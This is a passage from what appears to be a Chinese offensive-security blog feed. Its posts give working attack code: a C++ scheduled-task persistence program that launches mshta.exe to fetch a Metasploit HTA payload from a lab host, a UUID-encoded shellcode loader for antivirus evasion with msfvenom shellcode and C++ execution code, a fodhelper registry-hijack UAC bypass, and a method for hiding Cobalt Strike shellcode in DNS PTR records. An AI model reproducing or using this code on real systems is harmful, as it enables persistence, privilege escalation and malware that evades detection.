lpszTaskName;<br>HRESULT hr = m_lpRootFolder-&gt;DeleteTask(variantTaskName.bstrVal, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (FAILED(hr))<br>&#123;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* lpszTaskName = <span class="hljs-string">&quot;aaasacwss&quot;</span>;   <span class="hljs-comment">//任务名</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* lpszProgramPath = <span class="hljs-string">&quot;c:\\windows\\system32\\mshta.exe&quot;</span>;  <span class="hljs-comment">//要执行的程序路径</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* lpszParameters = <span class="hljs-string">&quot;http://192.168.111.129:8080/p7ptgsev.hta&quot;</span>;     <span class="hljs-comment">//程序参数</span><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* lpszAuthor = <span class="hljs-string">&quot;&quot;</span>;<br><br>Init();<br>BOOL bRet=CreateTask(lpszTaskName, lpszProgramPath, lpszParameters, lpszAuthor);<br><span class="hljs-keyword">if</span> (!bRet) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Create Task Failed&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>UnInit();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Successd&quot;</span>);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>运行</p><p><a href="https://imgbed.cn/preview?id=603b58fbe028a50001c1d1b4"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/96f48898-e4f9-49b8-a268-eb5857e5af25.png" alt="imgbed.cn图床"></a></p><p>添加成功</p><p><a href="https://imgbed.cn/preview?id=603b590ede602f00013761dd"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/d3bed366-0653-445c-bb85-c3ca43d26f8b.png" alt="imgbed.cn图床"></a></p><p>使用msf中的hta_server产生hta文件并传递payload，重启后返回一个Session</p><p><a href="https://imgbed.cn/preview?id=603b5904fac28b0001cfe814"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/914aa532-5678-4d12-b56a-46493f2b9c6d.png" alt="imgbed.cn图床"></a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>uuid免杀</title>
    <link href="/2021/02/27/uuid%E5%85%8D%E6%9D%80/"/>
    <url>/2021/02/27/uuid%E5%85%8D%E6%9D%80/</url>
    
    <content type="html"><![CDATA[<h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><h2 id="UUID"><a href="#UUID" class="headerlink" title="UUID"></a>UUID</h2><p>通用唯一标识符（universally unique identifier, UUID）是一个128位的用于在计算机系统中以识别信息的数目。在Windows中也有使用GUID来标识唯一对象</p><h2 id="将shellcode转换为uuid"><a href="#将shellcode转换为uuid" class="headerlink" title="将shellcode转换为uuid"></a>将shellcode转换为uuid</h2><p>用msf生成shellcode</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">msfvenom -p windows<span class="hljs-regexp">/x64/</span>exec CMD=<span class="hljs-string">&quot;calc.exe&quot;</span> -f c<br></code></pre></td></tr></table></figure><p><a href="https://imgbed.cn/preview?id=6039dc936cea45000128758e"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/d6eab119-32a6-4f11-8d66-7275a9f557ee.png" alt="imgbed.cn图床"></a></p><p>16个字节转换为一个uuid值，不满时用\x00填充，\x00占一个字节</p><p>首先用python把shellcode转换为uuid</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">uuid.<span class="hljs-constructor">UUID(<span class="hljs-params">bytes_le</span>=<span class="hljs-params">u</span>)</span><br></code></pre></td></tr></table></figure><p>uuid转换为字节</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">uuid.UUID(&#x27;1f748bef-481c-fe01-<span class="hljs-number">8b34</span>-ae4801f799ff&#x27;).bytes_le<br></code></pre></td></tr></table></figure><p>将shellcode转换为uuid，不足十六个字节的用\x00补全</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> uuid<br><br>shellcode=<span class="hljs-string">b&#x27;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&#x27;</span><br>shellcodelist=[]<br><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(shellcode)%<span class="hljs-number">16</span>!=<span class="hljs-number">0</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(shellcode)%<span class="hljs-number">16</span>!=<span class="hljs-number">0</span>:<br>        shellcode+=<span class="hljs-string">b&#x27;\x00&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(shellcode)//<span class="hljs-number">16</span>):<br>    u=<span class="hljs-built_in">str</span>(uuid.UUID(bytes_le=shellcode[i*<span class="hljs-number">16</span>:i*<span class="hljs-number">16</span>+<span class="hljs-number">16</span>]))<br>    shellcodelist.append(u)<br>print(shellcodelist)<br></code></pre></td></tr></table></figure><p><a href="https://imgbed.cn/preview?id=6039dc9ab6ce210001ce90fa"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/a031db93-5756-4b36-b3af-26a7daf85873.png" alt="imgbed.cn图床"></a></p><p>加载shellcode</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Rpc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;Rpcrt4.lib&quot;</span>)</span><br><br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* uuids[] =<br>&#123;<br><span class="hljs-string">&quot;e48348fc-e8f0-00c0-0000-415141505251&quot;</span>,<br><span class="hljs-string">&quot;d2314856-4865-528b-6048-8b5218488b52&quot;</span>,<br><span class="hljs-string">&quot;728b4820-4850-b70f-4a4a-4d31c94831c0&quot;</span>,<br><span class="hljs-string">&quot;7c613cac-2c02-4120-c1c9-0d4101c1e2ed&quot;</span>,<br><span class="hljs-string">&quot;48514152-528b-8b20-423c-4801d08b8088&quot;</span>,<br><span class="hljs-string">&quot;48000000-c085-6774-4801-d0508b481844&quot;</span>,<br><span class="hljs-string">&quot;4920408b-d001-56e3-48ff-c9418b348848&quot;</span>,<br><span class="hljs-string">&quot;314dd601-48c9-c031-ac41-c1c90d4101c1&quot;</span>,<br><span class="hljs-string">&quot;f175e038-034c-244c-0845-39d175d85844&quot;</span>,<br><span class="hljs-string">&quot;4924408b-d001-4166-8b0c-48448b401c49&quot;</span>,<br><span class="hljs-string">&quot;8b41d001-8804-0148-d041-5841585e595a&quot;</span>,<br><span class="hljs-string">&quot;59415841-5a41-8348-ec20-4152ffe05841&quot;</span>,<br><span class="hljs-string">&quot;8b485a59-e912-ff57-ffff-5d48ba010000&quot;</span>,<br><span class="hljs-string">&quot;00000000-4800-8d8d-0101-000041ba318b&quot;</span>,<br><span class="hljs-string">&quot;d5ff876f-f0bb-a2b5-5641-baa695bd9dff&quot;</span>,<br><span class="hljs-string">&quot;c48348d5-3c28-7c06-0a80-fbe07505bb47&quot;</span>,<br><span class="hljs-string">&quot;6a6f7213-5900-8941-daff-d563616c632e&quot;</span>,<br><span class="hljs-string">&quot;00657865-0000-0000-0000-000000000000&quot;</span>,<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">void</span>* ha = HeapAlloc(hc, <span class="hljs-number">0</span>, <span class="hljs-number">0x100000</span>); <span class="hljs-comment">//ha为指向申请堆的首地址的指针</span><br>    DWORD_PTR hptr = (DWORD_PTR)ha;   <span class="hljs-comment">//让hptr指向ha</span><br>    <span class="hljs-keyword">int</span> elems = <span class="hljs-keyword">sizeof</span>(uuids) / <span class="hljs-keyword">sizeof</span>(uuids[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; elems; i++) &#123;<br>        RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);<span class="hljs-comment">//转换后指向uuid地址保存在hptr</span><br>        <span class="hljs-keyword">if</span> (status != RPC_S_OK) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;failed&quot;</span>);<br>            CloseHandle(ha);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>        hptr += <span class="hljs-number">16</span>;<br><br>    &#125;<br>    EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, <span class="hljs-number">0</span>); <span class="hljs-comment">//把EnumSystemLocalesA参数中的回调函数设置为指向shellcode地址指针，执行shellcode</span><br>    CloseHandle(ha);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行成功</p><p><a href="https://imgbed.cn/preview?id=6039dca0c9e7be00013afdd7"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/874561fe-2ef9-4fb3-a6a4-05a9286bd1a9.png" alt="imgbed.cn图床"></a></p><h1 id="API函数"><a href="#API函数" class="headerlink" title="API函数"></a>API函数</h1><h2 id="UuidFromStringA"><a href="#UuidFromStringA" class="headerlink" title="UuidFromStringA"></a>UuidFromStringA</h2><p>将字符串形式的shellcode转换为UUID，成功返回RPC_S_OK，失败返回RPC_S_INVALID_STRING_UUID</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">RPC_STATUS <span class="hljs-title">UuidFromStringA</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  RPC_CSTR StringUuid, <span class="hljs-comment">//指向字符串的指针</span></span></span><br><span class="hljs-function"><span class="hljs-params">  UUID     *Uuid <span class="hljs-comment">//以二进制形式返回指向UUID的指针。 </span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><h2 id="EnumSystemLocalesA"><a href="#EnumSystemLocalesA" class="headerlink" title="EnumSystemLocalesA"></a>EnumSystemLocalesA</h2><p>功能为枚举操作系统上安装或支持的语言环境，第一个参数为指向应用程序定义的回调函数的指针，将它设置为指向UUID的指针即可执行shellcode</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">EnumSystemLocalesA</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  LOCALE_ENUMPROCA lpLocaleEnumProc, <span class="hljs-comment">///指向应用程序定义的回调函数的指针</span></span></span><br><span class="hljs-function"><span class="hljs-params">  DWORD            dwFlags <span class="hljs-comment">//指定要枚举的语言环境标识符的标志</span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>注册表劫持BypassUAC</title>
    <link href="/2021/02/26/%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%8A%AB%E6%8C%81BypassUAC/"/>
    <url>/2021/02/26/%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%8A%AB%E6%8C%81BypassUAC/</url>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>一部分系统程序可以直接获取管理员权限而不触发UAC弹窗，这类程序被称为白名单程序。如fodhelper</p><p>fodhelper.exe在启动过程查询注册表项</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">HKCU:<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\C</span>lasses<span class="hljs-symbol">\m</span>s-settings<span class="hljs-symbol">\S</span>hell<span class="hljs-symbol">\O</span>pen<span class="hljs-symbol">\c</span>ommand<br></code></pre></td></tr></table></figure><p>该键值对存储可执行文件路径，普通用户对HKCU有编辑权限，可以写入想要执行的任意文件，如cmd.exe，写入后的文件会以最高权限执行</p><p>如果上一个键值对存在，继续查询</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">HKCU:<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\C</span>lasses<span class="hljs-symbol">\m</span>s-settings<span class="hljs-symbol">\s</span>hell<span class="hljs-symbol">\o</span>pen<span class="hljs-symbol">\c</span>ommand<span class="hljs-symbol">\D</span>elegateExecute<br></code></pre></td></tr></table></figure><p>若也存在，则读取第一个注册内的值执行</p><p>当找不到HKCU\Software\Classes\ms-settings\Shell\Open\command的时候才会去找HKCR\ms-settings\Classes\ms-settings\Shell\Open\command</p><p>默认情况下而HKCR\ms-settings\Classes\ms-settings\Shell\Open\command存在，而HKCU\Software\Classes\ms-settings\不存在，因此需要手动创建。</p><p><a href="https://imgbed.cn/preview?id=6038d2e104fa2d0001e3c1a7"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/238ed07e-992a-405b-aadc-e1e19b43335b.png" alt="imgbed.cn图床"></a></p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>1.RegCreateKeyA创建HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command\</p><p>2.使用RegSetValueEx向创建的键值对里写入要执行的文件和DelegateExecute</p><p>3.CreateProcessA创建进程运行fodhelper.exe，以高权限运行向注册表中写入的文件</p><p>4.在一段时间后使用RegDeleteTreeA删除创建的键值对，恢复原状</p><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br>    <br>    HKEY hKey;<br>    STARTUPINFOA StartupInfo = &#123; <span class="hljs-number">0</span> &#125;;<br>    PROCESS_INFORMATION ProcessInformation = &#123; <span class="hljs-number">0</span> &#125;;<br>    <br>    <span class="hljs-comment">//创建注册表</span><br>    RegCreateKeyA(HKEY_CURRENT_USER, <span class="hljs-string">&quot;Software\\Classes\\ms-settings\\Shell\\open\\command&quot;</span>, &amp;hKey);<br>    <span class="hljs-comment">//写入要执行的文件</span><br>    RegSetValueExA(hKey, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">0</span>, REG_SZ, (BYTE*)<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>));<br>    <span class="hljs-comment">//写入DelegateExecute</span><br>    RegSetValueExA(hKey, <span class="hljs-string">&quot;DelegateExecute&quot;</span>, <span class="hljs-number">0</span>, REG_SZ, (BYTE*)<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;&quot;</span>));<br>    <br>    <span class="hljs-comment">//创建进程，运行fodhelper以高权限执行写入的文件</span><br>    CreateProcessA(<span class="hljs-string">&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>, (LPSTR)<span class="hljs-string">&quot;/c C:\\Windows\\System32\\fodhelper.exe&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE, NORMAL_PRIORITY_CLASS, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;StartupInfo, &amp;ProcessInformation);<br>    <br>    Sleep(<span class="hljs-number">3000</span>);<br><br>    <span class="hljs-comment">//删除创建的ms-settings</span><br>    RegDeleteTreeA(hKey, <span class="hljs-string">&quot;Software\\Classes\\ms-settings&quot;</span>);<span class="hljs-comment">//删除</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行前</p><p><a href="https://imgbed.cn/preview?id=6038d2eb9efdd1000198559c"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/53a992dc-d44f-405b-9849-2cfaeb72aa97.png" alt="imgbed.cn图床"></a></p><p>执行后</p><p><a href="https://imgbed.cn/preview?id=6038d2f204fa2d0001e3c1d7"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/ed3760d0-c0d5-46ff-9c79-73f2f3b2a87e.png" alt="imgbed.cn图床"></a></p><h1 id="相关API函数"><a href="#相关API函数" class="headerlink" title="相关API函数"></a>相关API函数</h1><h2 id="RegCreateKeyA"><a href="#RegCreateKeyA" class="headerlink" title="RegCreateKeyA"></a>RegCreateKeyA</h2><p>创建键值对</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">LSTATUS <span class="hljs-title">RegCreateKeyA</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  HKEY   hKey, </span></span><br><span class="hljs-function"><span class="hljs-params">  LPCSTR lpSubKey,</span></span><br><span class="hljs-function"><span class="hljs-params">  PHKEY  phkResult</span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><h2 id="RegSetValueEx"><a href="#RegSetValueEx" class="headerlink" title="RegSetValueEx"></a>RegSetValueEx</h2><p>写入注册表键值</p><p>成功返回 ERROR_SUCCESS.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">LSTATUS <span class="hljs-title">RegSetValueExA</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  HKEY       hKey,<span class="hljs-comment">//指向一个已经被打开或创建的子键句柄 </span></span></span><br><span class="hljs-function"><span class="hljs-params">  LPCSTR     lpValueName,<span class="hljs-comment">//指定要被查询或写入的键值的名称</span></span></span><br><span class="hljs-function"><span class="hljs-params">  DWORD      Reserved,<span class="hljs-comment">//保留，始终为0   </span></span></span><br><span class="hljs-function"><span class="hljs-params">  DWORD      dwType,<span class="hljs-comment">//写入键值的类型   </span></span></span><br><span class="hljs-function"><span class="hljs-params">  <span class="hljs-keyword">const</span> BYTE *lpData,<span class="hljs-comment">//写入键值的缓冲区   </span></span></span><br><span class="hljs-function"><span class="hljs-params">  DWORD      cbData<span class="hljs-comment">//写入键值缓冲区的长度    </span></span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><h2 id="RegDeleteTreeA"><a href="#RegDeleteTreeA" class="headerlink" title="RegDeleteTreeA"></a>RegDeleteTreeA</h2><p>删除键值对</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">LSTATUS <span class="hljs-title">RegDeleteTreeA</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  HKEY   hKey,</span></span><br><span class="hljs-function"><span class="hljs-params">  LPCSTR lpSubKey</span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><h2 id="CreateProcessA"><a href="#CreateProcessA" class="headerlink" title="CreateProcessA"></a>CreateProcessA</h2><p>创建进程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">CreateProcessA</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  LPCSTR                lpApplicationName,</span></span><br><span class="hljs-function"><span class="hljs-params">  LPSTR                 lpCommandLine,</span></span><br><span class="hljs-function"><span class="hljs-params">  LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span><br><span class="hljs-function"><span class="hljs-params">  LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span><br><span class="hljs-function"><span class="hljs-params">  BOOL                  bInheritHandles,</span></span><br><span class="hljs-function"><span class="hljs-params">  DWORD                 dwCreationFlags,</span></span><br><span class="hljs-function"><span class="hljs-params">  LPVOID                lpEnvironment,</span></span><br><span class="hljs-function"><span class="hljs-params">  LPCSTR                lpCurrentDirectory,</span></span><br><span class="hljs-function"><span class="hljs-params">  LPSTARTUPINFOA        lpStartupInfo,</span></span><br><span class="hljs-function"><span class="hljs-params">  LPPROCESS_INFORMATION lpProcessInformation</span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>python利用dns的PTR记录加载shellcode</title>
    <link href="/2021/02/26/python%E5%88%A9%E7%94%A8dns%E7%9A%84PTR%E8%AE%B0%E5%BD%95%E5%8A%A0%E8%BD%BDshellcode/"/>
    <url>/2021/02/26/python%E5%88%A9%E7%94%A8dns%E7%9A%84PTR%E8%AE%B0%E5%BD%95%E5%8A%A0%E8%BD%BDshellcode/</url>
    
    <content type="html"><![CDATA[<p>DNS解析中的PTR记录负责反向解析，即把IP地址解析为域名。利用PTR记录保存shellcode，然后通过dns请求获取到shellcode后执行，来达到免杀的目的。</p><p>PTR记录的两个特性</p><p>1.不区分大小写，dns解析结果统一转为小写</p><p>2.格式不定，可以出现包括“!@#$%^&amp;*()_+=/?&lt;&gt;”在内的各种特殊字符和空格，只有反斜杠“\”会被过滤。</p><p>在本地服务器添加</p><p><a href="https://imgbed.cn/preview?id=6038a9145dc5370001f7945a"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/55f3eca3-d8ea-4169-a549-326d7d2c8f0b.png" alt="imgbed.cn图床"></a></p><p>进行反向解析查询，192.168.111.135为DNS服务器的ip</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nslookup</span> -qt=ptr <span class="hljs-number">192.168.111.1</span> <span class="hljs-number">192.168.111.135</span><br></code></pre></td></tr></table></figure><p>可以看到成功获取了之前设置好的内容，可以把这一段代码替换成shellcode</p><p><a href="https://imgbed.cn/preview?id=6038a92234dcf30001560686"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/15a83f1b-d165-43f1-a686-f9d8bcb36d54.png" alt="imgbed.cn图床"></a></p><p>用cs生成shellcode，由于shellcode本质是一串十六进制的机器码，因此可以先去掉前面的转义字符\x并以字符串的形式保存在PTR记录中，执行时再转为十六进制格式，也符合PTR记录中不能出现反斜杠的规则</p><p><a href="https://imgbed.cn/preview?id=6038a9299efdd1000197edba"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/e10794e5-a243-4aa6-9733-36ea2f2d29d6.png" alt="imgbed.cn图床"></a></p><p>分割shellcode，每个ip对应的PTR记录保存一行，这里添加的IP为192.168.111.20-192.168.111.59</p><p><a href="https://imgbed.cn/preview?id=6038a92ff6094a0001be155e"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/ed33f484-e269-47da-9eb8-4977fe010783.png" alt="imgbed.cn图床"></a></p><p>去掉所有的\x，把它们分割成多个部分按照顺序添加到PTR记录中</p><p><a href="https://imgbed.cn/preview?id=6038a93854a29f0001250fb6"><img 